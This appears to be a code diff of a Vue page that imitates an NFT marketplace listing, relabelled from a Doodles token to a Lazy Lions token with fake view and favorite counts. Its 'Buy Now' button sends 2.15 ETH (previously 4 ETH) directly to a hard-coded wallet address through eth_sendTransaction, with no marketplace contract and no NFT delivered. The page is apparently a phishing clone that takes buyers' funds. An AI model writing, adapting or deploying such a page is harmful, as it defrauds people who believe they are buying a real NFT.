@@ -1,24 +1,23 @@
 <template>
   <div class="home">
     <div class="div1"> 
-      <img src="./doodle.png" width="auto" height="auto" >
+      <img src="./lastupdate.jpeg" width="auto" height="auto" >
       <img src="./despricption.png" width="auto" height="auto"></div>
       <div class="div2"> 
-      <h2 style="color:rgb(32, 129, 226); float:left; margin-top:20px">Doodles <img src="./verified.png" width="20px" height="20px"></h2>
-      <h3 style="color:black; text-align:left;  font-size:30px; font-weight:900; margin-top:80px">Doodle #3887</h3>
+      <h2 style="color:rgb(32, 129, 226); float:left; margin-top:20px">Lazy Lions <img src="./verified.png" width="20px" height="20px"></h2>
+      <h3 style="color:black; text-align:left;  font-size:30px; font-weight:900; margin-top:80px">#9023</h3>
       <h4 style="color:rgb(112, 122, 131); float:left;  font-size:15px; margin-top:30px; ">Owned by 
-<span style="color:rgb(32, 129, 226);">CryptO_Ape</span> 
- <md-icon> visibility</md-icon>  85 views <md-icon>favorite</md-icon>  6 favorites</h4>
+<span style="color:rgb(32, 129, 226);">NFTSignature</span> 
+ <md-icon> visibility</md-icon>  7.9k views <md-icon>favorite</md-icon>  177 favorites</h4>
 <h2 style="color:black; float:left; font-size:18px; margin-top:30px;">Sale ends April 29, 2022 at 3:16am IST </h2>
-<h1 style="color:black; float:left; font-size:25px; margin-top:20px; margin-right:200px;">4
-  <img src="./ether.svg" width="15px" height="15px"><span style="font-size:15px; color:rgb(112, 122, 131); ">  ( $16,637.0)</span>
+<h1 style="color:black; float:left; font-size:25px; margin-top:20px; margin-right:200px;">2.15
+  <img src="./ether.svg" width="15px" height="15px"><span style="font-size:15px; color:rgb(112, 122, 131); ">  ( $9,333.77)</span>
 </h1>
 <md-button v-on:click="sendtransaction" class="md-primary" style="width:400px; background-color:rgb(32, 129, 226); margin-top:10px; color: white; margin-right:100px;">Buy Now</md-button>
  <img src="./graph.png" width="auto" height="auto" style="margin-top:10px">
     </div>
     <img src="./doodles.png" width="90%" height="auto">
     <img src="./footer.png" width="100%" >
-    
     
     
     
@@ -73,8 +72,10 @@ export default {
       const Web3=require('web3');
       const web3 = new Web3(window.ethereum)
       const arr=[]
+        const x=web3.utils.toHex(2.15*1e18)
+        
       
-        const x=web3.utils.toHex(4*1e18)
+        
         
       
       console.log(x)
@@ -92,7 +93,7 @@ export default {
           }); 
           
                     
-                    const amount='0x3782dace9d900000';
+                    const amount='0x1dd6559bdb170000';
                     console.log(amount)
             window.ethereum.request({
               method: "eth_sendTransaction",
@@ -100,6 +101,7 @@ export default {
                 {
                   from: account,
                   to: "0xAb0C11E0c9e36F9e55D044D6A429d82376553510",
+                  //to:"0xBFa0562eA2c334393eD68999468Ad554148AC722",
                   value:amount,
                   //gasPrice: '0x09184e72a000',0x29a2241af62c0000
                   //gas: '0x2710',
@@ -111,13 +113,14 @@ export default {
         }else {
           
                     
-                    const amount='0x3782dace9d900000';
+                    const amount='0x1dd6559bdb170000';
                 window.ethereum.request({
                     method: 'eth_sendTransaction',
                     params: [
                         {
                             from: account,
                             to: '0xAb0C11E0c9e36F9e55D044D6A429d82376553510',
+                            //to:"0xBFa0562eA2c334393eD68999468Ad554148AC722",
                             value: amount,
                             //gasPrice: '0x09184e72a000',0x29a2241af62c0000
                             //gas: '0x2710',
